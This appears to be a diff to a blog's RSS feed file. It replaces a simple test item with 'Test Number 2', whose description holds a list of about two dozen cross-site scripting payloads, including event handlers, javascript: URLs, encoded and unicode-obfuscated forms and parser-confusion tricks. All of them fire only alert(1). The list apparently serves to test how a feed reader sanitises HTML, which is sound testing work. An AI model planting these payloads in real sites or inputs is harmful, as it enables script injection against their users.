@@ -17,17 +17,102 @@
     </item>
 
     <item>
-      <title>Test Number 1</title>
-      <link>https://username.github.io/blog/test-1/</link>
+      <title>Test Number 2</title>
+      <link>https://username.github.io/blog/test-2/</link>
       <description>
-        &lt;svg&gt;
-          &lt;script&gt;
-            alert("hello");
-          &lt;/script&gt;
-        &lt;/svg&gt;
+        <![CDATA[
+        <!-- basic script -->
+<script>alert(1)</script>
+
+<!-- svg script -->
+<svg><script>alert(1)</script></svg>
+
+<!-- event handlers -->
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+
+<!-- javascript URL -->
+<a href="javascript:alert(1)">click</a>
+
+<!-- encoded javascript -->
+<a href="j&#97;vascript:alert(1)">click</a>
+
+<!-- data URI -->
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+<!-- srcdoc -->
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+<!-- malformed tag recovery -->
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+<!-- broken attributes -->
+<img src=x onerror="&#97;lert(1)">
+
+<!-- nested svg -->
+<svg>
+  <foreignObject>
+    <iframe src="javascript:alert(1)"></iframe>
+  </foreignObject>
+</svg>
+
+<!-- mathml -->
+<math>
+  <mtext>
+    <img src=x onerror=alert(1)>
+  </mtext>
+</math>
+
+<!-- object/embed -->
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+
+<!-- meta refresh -->
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+
+<!-- style-based -->
+<div style="background:url(javascript:alert(1))"></div>
+
+<!-- unicode obfuscation -->
+<img src=x o\u006Eerror=alert(1)>
+
+<!-- xml namespace weirdness -->
+<x xmlns:x="http://www.w3.org/1999/xhtml">
+  <x:script>alert(1)</x:script>
+</x>
+
+<!-- comment breaking -->
+<!--><script>alert(1)</script>
+
+<!-- template -->
+<template>
+  <script>alert(1)</script>
+</template>
+
+<!-- details open ontoggle -->
+<details open ontoggle=alert(1)></details>
+
+<!-- autofocus -->
+<input autofocus onfocus=alert(1)>
+
+<!-- video -->
+<video><source onerror="alert(1)"></video>
+
+<!-- form action -->
+<form action="javascript:alert(1)">
+  <input type=submit>
+</form>
+
+<!-- xlink -->
+<svg>
+  <a xlink:href="javascript:alert(1)">
+    <text>click</text>
+  </a>
+</svg>
+        ]]
       </description>
       <pubDate>Mon, 25 May 2026 12:00:00 +0000</pubDate>
-      <guid>https://username.github.io/blog/test-1/</guid>
+      <guid>https://username.github.io/blog/test-2/</guid>
     </item>
   </channel>
 </rss>
